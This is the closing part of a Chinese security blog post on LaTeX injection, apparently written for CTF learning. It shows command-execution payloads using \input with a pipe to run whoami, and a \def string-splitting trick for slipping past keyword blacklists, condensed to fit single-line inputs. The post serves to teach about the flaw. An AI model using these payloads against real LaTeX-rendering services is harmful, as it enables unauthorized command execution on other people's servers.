+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-20.png" alt="img"></p>
+<p>\makeatletter 和 \makeatother 用于修改 @ 符号的分类码，当 @ 的分类码被设置为 “letter” 后，@@input 命令会被执行，因为 @@input 实际上是对内部命令 \input 的调用。由于 @ 现在被视为普通字母字符，所以该命令变成了一个名为 @@input 的自定义命令</p>
+<ul>
+<li>如果 \write 被过滤，我们还可以使用 \input 配合管道符执行命令</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\input</span>|whoami</span><br><span class="line"><span class="keyword">\input</span>|whoami|base64</span><br><span class="line"><span class="keyword">\input</span>|&quot;whoami&quot;</span><br><span class="line"><span class="keyword">\input</span>&#123;|whoami&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-21.png" alt="img"></p>
+<ul>
+<li>\def 的利用</li>
+</ul>
+<p>其实就是一个定义变量的命令，可以用它来进行变量拼接字符串从而绕过黑名单</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\def</span> <span class="keyword">\a</span> &#123;<span class="keyword">\string</span>|who&#125;    <span class="comment">% 值里有特殊字符的时候字符前需要加 \string 转义</span></span><br><span class="line"><span class="keyword">\def</span> <span class="keyword">\b</span> &#123;ami&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">\input</span>&#123;<span class="keyword">\a</span><span class="keyword">\b</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-22.png" alt="img"></p>
+<ul>
+<li>实际情况中 LaTex 功能的插入一般只有一行，我们可以利用空格换行</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\def</span> <span class="keyword">\a</span> &#123;<span class="keyword">\string</span>|who&#125; <span class="keyword">\def</span> <span class="keyword">\b</span> &#123;ami&#125; <span class="keyword">\input</span>&#123;<span class="keyword">\a</span><span class="keyword">\b</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-23.png" alt="img"></p>
+<p>而且这种单行输入好像并不支持循环语句</p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>本来想和师傅们分享一下开头提到的两道 LaTex 相关的靶场和 CTF 题，但是 HTB 的就是一个简单的文件读取，而 Hackgame 的环境现在也已经打不开了，师傅们可以通过这篇 wp来观摩大佬的操作<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11809%EF%BC%8C%E7%84%B6%E5%90%8E%E6%88%91%E8%BF%99%E7%AF%87%E6%B6%89%E5%8F%8A%E7%9A%84%E5%86%85%E5%AE%B9%E6%AF%94%E8%BE%83%E5%9F%BA%E7%A1%80%EF%BC%8C%E4%B9%9F%E5%B8%8C%E6%9C%9B%E5%B8%88%E5%82%85%E4%BB%AC%E5%A4%9A%E5%A4%9A%E5%88%86%E4%BA%AB%E4%B8%80%E4%BA%9B%E8%BF%9B%E9%98%B6%E7%8E%A9%E6%B3%95%E8%AE%A9%E8%80%81%E5%BC%9F%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%EF%BC%8C%E4%B8%8E%E5%90%9B%E5%85%B1%E5%8B%89%EF%BC%81">https://xz.aliyun.com/t/11809，然后我这篇涉及的内容比较基础，也希望师傅们多多分享一些进阶玩法让老弟学习学习，与君共勉！</a></p>
+<p>References：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://oi-wiki.org/tools/latex">https://oi-wiki.org/tools/latex</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/security-management/308191.html">https://www.freebuf.com/articles/security-management/308191.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.noah.360.net/tex-restricted-mode-bypass">https://blog.noah.360.net/tex-restricted-mode-bypass</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11809#toc-4">https://xz.aliyun.com/t/11809#toc-4</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection">https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/LaTex/" rel="tag"># LaTex</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/11/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" rel="prev" title="Python沙箱逃逸">
+      <i class="fa fa-chevron-left"></i> Python沙箱逃逸
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/11/06/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="next" title="Nodejs原型链污染">
+      Nodejs原型链污染 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-LaTex%E7%8E%AF%E5%A2%83"><span class="nav-number">3.</span> <span class="nav-text">0x02 LaTex环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows"><span class="nav-number">3.0.1.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#https-www-papeeria-com"><span class="nav-number">3.0.1.0.1.</span> <span class="nav-text">https:&#x2F;&#x2F;www.papeeria.com</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux"><span class="nav-number">3.0.2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#texlive"><span class="nav-number">3.0.2.0.1.</span> <span class="nav-text">texlive</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">4.</span> <span class="nav-text">0x03 攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">4.0.1.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="nav-number">4.0.2.</span> <span class="nav-text">文件读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.0.3.</span> <span class="nav-text">命令执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">0x04 总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="YDJ"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">YDJ</p>
+  <div class="site-description" itemprop="description">我这一生，如履薄冰</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">发布</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">YDJ</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">22k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:12</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
